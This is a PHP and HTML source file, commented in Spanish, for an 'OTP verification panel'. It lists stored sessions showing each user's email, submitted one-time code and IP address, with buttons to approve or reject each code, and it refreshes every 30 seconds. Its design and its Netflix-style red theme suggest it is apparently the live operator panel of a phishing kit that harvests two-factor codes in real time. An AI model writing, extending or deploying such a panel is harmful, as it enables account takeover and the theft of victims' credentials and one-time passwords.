<?php
// Panel simple para verificar OTPs

// Obtener lista de sesiones con OTP pendiente
$pending_otps = [];
$sessions_dir = __DIR__ . '/sessions';
if (is_dir($sessions_dir)) {
    $files = scandir($sessions_dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..' && pathinfo($file, PATHINFO_EXTENSION) === 'json') {
            $session_data = json_decode(file_get_contents($sessions_dir . '/' . $file), true);
            
            // Verificar si tiene OTP enviado pero no verificado
            if (isset($session_data['otp_submitted']) && $session_data['otp_submitted'] === true &&
                (!isset($session_data['manually_verified']) || $session_data['manually_verified'] !== true)) {
                $pending_otps[] = $session_data;
            }
        }
    }
}

// Ordenar por fecha de actualización (más reciente primero)
usort($pending_otps, function($a, $b) {
    $time_a = strtotime($a['updated_at'] ?? '0');
    $time_b = strtotime($b['updated_at'] ?? '0');
    return $time_b - $time_a;
});
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel OTP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #e50914;
            margin-bottom: 20px;
        }
        .otp-card {
            background-color: #f9f9f9;
            border-left: 4px solid #e50914;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 4px;
        }
        .otp-info {
            margin-bottom: 10px;
        }
        .otp-actions {
            display: flex;
            gap: 10px;
        }
        .btn {
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            color: white;
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-danger {
            background-color: #dc3545;
        }
        .no-otps {
            background-color: #f9f9f9;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
        }
        .status-message {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 4px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Panel de Verificación OTP</h1>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div id="otpList">
            <?php if (empty($pending_otps)): ?>
                <div class="no-otps">
                    <p>No hay OTPs pendientes de verificación.</p>
                </div>
            <?php else: ?>
                <?php foreach ($pending_otps as $otp): ?>
                    <div class="otp-card" id="otp-<?php echo htmlspecialchars($otp['session_id']); ?>">
                        <div class="otp-info">
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($otp['email'] ?? 'N/A'); ?></p>
                            <p><strong>OTP:</strong> <?php echo htmlspecialchars($otp['otp_code'] ?? 'N/A'); ?></p>
                            <p><strong>IP:</strong> <?php echo htmlspecialchars($otp['ip'] ?? 'N/A'); ?></p>
                            <p><strong>Fecha:</strong> <?php echo htmlspecialchars($otp['updated_at'] ?? 'N/A'); ?></p>
                        </div>
                        <div class="otp-actions">
                            <button class="btn btn-success" onclick="verifyOTP('<?php echo htmlspecialchars($otp['session_id']); ?>', true)">
                                Aprobar OTP
                            </button>
                            <button class="btn btn-danger" onclick="verifyOTP('<?php echo htmlspecialchars($otp['session_id']); ?>', false)">
                                Rechazar OTP
                            </button>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        
        <div style="margin-top: 20px; text-align: center;">
            <button onclick="location.reload()" style="background-color: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer;">
                Actualizar lista
            </button>
        </div>
    </div>

    <script>
        function verifyOTP(sessionId, isValid) {
            // Deshabilitar botones
            const card = document.getElementById(`otp-${sessionId}`);
            const buttons = card.querySelectorAll('button');
            buttons.forEach(btn => btn.disabled = true);
            
            // Enviar solicitud a la API
            fetch('api_verify_otp.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    session_id: sessionId,
                    is_valid: isValid
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Mostrar mensaje de éxito
                    showStatusMessage(
                        isValid ? 'OTP aprobado correctamente.' : 'OTP rechazado correctamente.',
                        'success'
                    );
                    
                    // Eliminar la tarjeta
                    setTimeout(() => {
                        card.style.opacity = '0';
                        card.style.transition = 'opacity 0.5s';
                        setTimeout(() => {
                            card.remove();
                            
                            // Verificar si no quedan más OTPs
                            if (document.querySelectorAll('.otp-card').length === 0) {
                                document.getElementById('otpList').innerHTML = `
                                    <div class="no-otps">
                                        <p>No hay OTPs pendientes de verificación.</p>
                                    </div>
                                `;
                            }
                        }, 500);
                    }, 1000);
                } else {
                    // Mostrar mensaje de error
                    showStatusMessage('Error al verificar el OTP: ' + data.message, 'error');
                    
                    // Habilitar botones nuevamente
                    buttons.forEach(btn => btn.disabled = false);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showStatusMessage('Error de conexión. Inténtalo de nuevo.', 'error');
                
                // Habilitar botones nuevamente
                buttons.forEach(btn => btn.disabled = false);
            });
        }
        
        function showStatusMessage(message, type) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.textContent = message;
            statusMessage.className = 'status-message ' + type;
            statusMessage.style.display = 'block';
            
            // Ocultar mensaje después de 5 segundos
            setTimeout(() => {
                statusMessage.style.opacity = '0';
                statusMessage.style.transition = 'opacity 0.5s';
                setTimeout(() => {
                    statusMessage.style.display = 'none';
                    statusMessage.style.opacity = '1';
                }, 500);
            }, 5000);
        }
        
        // Actualizar la lista cada 30 segundos
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>